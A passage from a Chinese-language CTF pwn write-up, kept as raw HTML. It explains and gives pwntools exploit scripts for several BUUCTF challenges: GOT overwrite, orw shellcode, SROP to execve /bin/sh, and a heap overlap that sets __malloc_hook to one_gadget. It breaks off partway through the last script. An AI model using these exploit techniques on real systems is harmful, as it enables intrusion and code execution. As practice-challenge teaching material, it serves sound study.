data-num=\"39\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> c3r<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> c3r<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># 3-> 0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>change<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">,</span> puts_p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>change<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">,</span> sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwnable_asm\"><a class=\"markdownIt-Anchor\" href=\"#pwnable_asm\">#</a> pwnable_asm</h1>\n<p>** 考点：**shellcode, orw</p>\n<p>保护：</p>\n<p><img data-src=\"./image-20231128193217282.png\" alt=\"image-20231128193217282\"></p>\n<p>存在沙盒保护，只能使用 orw 三个系统调用。</p>\n<p><img data-src=\"./image-20231128193307592.png\" alt=\"image-20231128193307592\"></p>\n<p>输入没有限制，所以直接 orw。</p>\n<p>这边执行 shellcode 前会清空除了 rsp 以外的寄存器，所以这边将读入的 flag 放在 rsp-0x100 的地方。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./asm')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28437</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>assem <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mov rdx, &#123;&#125;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>push 0</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>push rdx</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>mov rdi, rsp</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>xor rsi, rsi</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>xor rdx, rdx</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mov rax, 0x2</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>mov rdi, 3</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>mov rsi, rsp</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>add rsi, 0x100</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>mov rdx, 0x30</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>xor rax, rax</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>mov rdi, 1</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mov rax, 1</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>'''</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'shellcode: '</span><span class=\"token punctuation\">,</span>asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"rootersctf_2019_srop\"><a class=\"markdownIt-Anchor\" href=\"#rootersctf_2019_srop\">#</a> rootersctf_2019_srop</h1>\n<p>** 考点：**srop</p>\n<p>程序非常简单。可输入的字符串长度很大。</p>\n<p>题目没有直接调用 0xf 系统调用号的代码。但是程序在调用 read 系统调用时用的 <code>push 0; pop rax</code> ，我们可以利用这个 <code>pop rax</code>  以及构造 rop chain 实现 0xf 系统调用。</p>\n<p><img data-src=\"./image-20231128202901628.png\" alt=\"image-20231128202901628\"></p>\n<p>vmmap 查看可读写地址段，将栈迁移至 0x402900 处即可。</p>\n<p><img data-src=\"./image-20231128203036904.png\" alt=\"image-20231128203036904\"></p>\n<p>一次 read 的 sigreturn，一次 execve 的 sigreturn。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./rootersctf_2019_srop'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26979</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x40101f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x080</span><span class=\"token operator\">+</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token number\">0x402900</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>popsys <span class=\"token operator\">=</span> <span class=\"token number\">0x401032</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x401033</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sig <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x300</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rbp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>popsys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sig<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>suspend<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sig <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> <span class=\"token number\">0x3b</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> buf<span class=\"token operator\">+</span><span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rbp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>popsys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sig<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"houseoforange_hitcon_2016\"><a class=\"markdownIt-Anchor\" href=\"#houseoforange_hitcon_2016\">#</a> houseoforange_hitcon_2016</h1>\n<p><img data-src=\"./image-20231202155115909.png\" alt=\"image-20231202155115909\"></p>\n<p>0x7f8c6dbc56f8</p>\n<p>0x7F8C6DBC5188</p>\n<p>0x55DB6664B161</p>\n<p>1:0x7fd82bbc5188<br>\n2:0x5639f58c6161<br>\n0x00005639f58e8000</p>\n<p>0x7fd82bbc56f8</p>\n<h1 id=\"gyctf_2020_document\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_document\">#</a> gyctf_2020_document</h1>\n<p><strong>考点：</strong> overlap, heap</p>\n<p>** 版本：**libc-2.23_amd64</p>\n<p>这题保护全开。</p>\n<p>分配函数固定分配两个 chunk，分别为 <code>0x8(0x20)</code>  和 <code>0x80(0x90)</code>  的 chunk。0x8 的 chunk 储存 <code>0x80chunk</code>  的指针。结构大致如以下注释。</p>\n<p><img data-src=\"./image-20231204181819985.png\" alt=\"image-20231204181819985\"></p>\n<p>而 edit 函数允许编辑一次 <code>0x80chunk</code> ，是否编辑过取决于 <code>0x8chunk</code>  内 + 8 处的值。可以选择修改 + 8 处的值为固定的 0x10 或 0x1，或者 + 16 处任意写入 0x70 字节。</p>\n<p>释放函数只释放了 <code>0x80chunk</code> ，并且没有清空地址。0x90 的 chunk 属于 <code>unsortbin</code>  的范围。</p>\n<h2 id=\"思路-3\"><a class=\"markdownIt-Anchor\" href=\"#思路-3\">#</a> 思路</h2>\n<p>分配函数后释放，然后利用输出函数泄露 <code>unsortbin chunk</code>  的 <code>mainarena</code>  地址。由此计算出 <code>one_gadget</code>  和 <code>__malloc_hook</code>  的地址。</p>\n<p>然后继续分配 2 次。由于先分配的 <code>0x8chunk</code> ，会将刚刚释放的 chunk 分割。而此时再对第一次分配的 chunk 执行编辑函数，就可以修改该 <code>0x8chunk</code> ，从而可以利用编辑函数实现任意地址读写。</p>\n<p>老方法，修改 <code>__malloc_hook</code>  为 <code>one_gadget</code> 。这题需要 <code>realloc</code>  进行跳板，并且需要调整进入 <code>realloc</code>  函数的位置。</p>\n<p><img data-src=\"./image-20231204181304248.png\" alt=\"image-20231204181304248\"></p>\n<p><img data-src=\"./image-20231204180850418.png\" alt=\"image-20231204180850418\"></p>\n<p><img data-src=\"./image-20231204180931543.png\" alt=\"image-20231204180931543\"></p>\n<p>调用 <code>realloc</code>  前栈顶为 <code>0xb2c8</code>  位置，而 <code>realloc</code>  调用 <code>one_gadget</code>  时 <code>esp+0x70</code>  正好指向 <code>0xb2c8</code> ，因此只需要少 push 4 个数，让 <code>esp+0x70</code>  指向 <code>0xb2e8</code>  即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_document'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27819</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x1207)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">,</span> sex<span class=\"token operator\">=</span><span class=\"token string\">b'W'</span><span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input name\\n'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input sex\\n'</span><span class=\"token punctuation\">,</span> sex<span class=\"token 